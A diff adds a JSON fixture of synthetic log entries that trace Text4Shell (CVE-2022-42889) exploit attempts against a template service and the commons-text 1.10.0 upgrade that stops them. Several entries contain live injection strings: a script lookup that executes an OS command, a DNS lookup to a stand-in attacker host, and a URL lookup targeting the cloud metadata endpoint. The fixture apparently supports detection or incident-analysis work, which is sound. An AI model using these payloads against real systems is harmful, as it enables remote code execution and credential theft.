@@ -1,0 +1,134 @@
+[
+  {
+    "id": "t4s-0001",
+    "timestamp": "2022-10-27T08:15:03Z",
+    "service": "template-svc",
+    "level": "INFO",
+    "trace_id": "t-t4s-0001",
+    "logger": "com.company.template.NotificationTemplateRenderer",
+    "message": "Rendering notification template for user='${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}' template=welcome_email",
+    "env": "production",
+    "note": "synthetic \u2014 represents attacker-controlled display_name field passed to StringSubstitutor.replace()"
+  },
+  {
+    "id": "t4s-0002",
+    "timestamp": "2022-10-27T08:15:03Z",
+    "service": "template-svc",
+    "level": "WARN",
+    "trace_id": "t-t4s-0001",
+    "logger": "org.apache.commons.text.lookup.ScriptStringLookup",
+    "message": "ScriptStringLookup: executing script engine lookup. engine=javascript expression=java.lang.Runtime.getRuntime().exec(\"id\")",
+    "env": "production",
+    "note": "synthetic \u2014 ScriptStringLookup executes before any guard is in place"
+  },
+  {
+    "id": "t4s-0003",
+    "timestamp": "2022-10-27T08:15:04Z",
+    "service": "template-svc",
+    "level": "ERROR",
+    "trace_id": "t-t4s-0001",
+    "logger": "com.company.template.NotificationTemplateRenderer",
+    "message": "StringSubstitutor variable resolution triggered OS process: output='uid=1000(app) gid=1000(app)'. CVE-2022-42889: commons-text 1.9 allows script/dns/url lookups by default.",
+    "env": "production",
+    "note": "synthetic"
+  },
+  {
+    "id": "t4s-0004",
+    "timestamp": "2022-10-27T08:16:11Z",
+    "service": "template-svc",
+    "level": "ERROR",
+    "trace_id": "t-t4s-0002",
+    "logger": "com.company.template.NotificationTemplateRenderer",
+    "message": "Template rendering failed \u2014 StringSubstitutor payload in user input. payload='${dns:attacker.company.com}' user_id=8812",
+    "env": "production",
+    "note": "synthetic \u2014 DNS-based SSRF / data exfiltration variant"
+  },
+  {
+    "id": "t4s-0005",
+    "timestamp": "2022-10-27T08:16:12Z",
+    "service": "template-svc",
+    "level": "ERROR",
+    "trace_id": "t-t4s-0002",
+    "logger": "org.apache.commons.text.lookup.DnsStringLookup",
+    "message": "DnsStringLookup: resolving attacker.company.com. Response=93.184.216.34. Lookup triggered by user-controlled input.",
+    "env": "production",
+    "note": "synthetic"
+  },
+  {
+    "id": "t4s-0006",
+    "timestamp": "2022-10-27T08:17:30Z",
+    "service": "template-svc",
+    "level": "WARN",
+    "trace_id": "t-t4s-0003",
+    "logger": "com.company.security.InputSanitizer",
+    "message": "Suspicious StringSubstitutor variable detected in template input: ${url:UTF-8:http://169.254.169.254/latest/meta-data/}. Possible SSRF via commons-text CVE-2022-42889.",
+    "env": "production",
+    "note": "synthetic \u2014 IMDS metadata exfiltration attempt via url lookup"
+  },
+  {
+    "id": "t4s-0007",
+    "timestamp": "2022-10-27T08:18:02Z",
+    "service": "template-svc",
+    "level": "ERROR",
+    "trace_id": "t-t4s-0004",
+    "logger": "com.company.template.NotificationTemplateRenderer",
+    "message": "commons-text StringSubstitutor exploit attempts: 14 in last 120s. Payloads: script/dns/url lookups. All requests returning 500. commons-text version=1.9 is vulnerable. Upgrade to 1.10.0 required.",
+    "env": "production",
+    "note": "synthetic"
+  },
+  {
+    "id": "t4s-0008",
+    "timestamp": "2022-10-27T08:19:45Z",
+    "service": "template-svc",
+    "level": "WARN",
+    "trace_id": "t-t4s-0005",
+    "logger": "com.company.template.NotificationTemplateRenderer",
+    "message": "Template rendering failure rate 31% over last 90s. All failures trace to StringSubstitutor.replace() on user-controlled input. Likely caused by CVE-2022-42889 exploit attempts.",
+    "env": "production",
+    "note": "synthetic"
+  },
+  {
+    "id": "t4s-0009",
+    "timestamp": "2022-10-27T08:45:00Z",
+    "service": "template-svc",
+    "level": "INFO",
+    "trace_id": "t-t4s-0006",
+    "logger": "com.company.deploy.ReleaseManager",
+    "message": "Deploying commons-text 1.10.0 fix for CVE-2022-42889. Change: StringLookupFactory disables ScriptStringLookup, DnsStringLookup, UrlStringLookup by default (TEXT-191). Restarting template-svc.",
+    "env": "production",
+    "note": "synthetic"
+  },
+  {
+    "id": "t4s-0010",
+    "timestamp": "2022-10-27T08:46:10Z",
+    "service": "template-svc",
+    "level": "INFO",
+    "trace_id": "t-t4s-0007",
+    "logger": "org.apache.commons.text.lookup.StringLookupFactory",
+    "message": "StringLookupFactory initialised. commons-text 1.10.0. Dangerous lookups disabled by default: SCRIPT=false DNS=false URL=false. CVE-2022-42889 mitigated.",
+    "env": "production",
+    "note": "synthetic"
+  },
+  {
+    "id": "t4s-0011",
+    "timestamp": "2022-10-27T08:46:30Z",
+    "service": "template-svc",
+    "level": "INFO",
+    "trace_id": "t-t4s-0008",
+    "logger": "com.company.template.NotificationTemplateRenderer",
+    "message": "StringSubstitutor.replace() processed payload '${script:javascript:java.lang.Runtime.getRuntime().exec(\"id\")}' \u2014 returned literal string, script lookup not executed. commons-text 1.10.0 active.",
+    "env": "production",
+    "note": "synthetic \u2014 confirms fix is effective"
+  },
+  {
+    "id": "t4s-0012",
+    "timestamp": "2022-10-27T08:47:00Z",
+    "service": "template-svc",
+    "level": "INFO",
+    "trace_id": "t-t4s-0009",
+    "logger": "com.company.template.NotificationTemplateRenderer",
+    "message": "Template rendering fully restored. commons-text 1.10.0 deployed. CVE-2022-42889 mitigated. Failure rate 0%.",
+    "env": "production",
+    "note": "synthetic"
+  }
+]
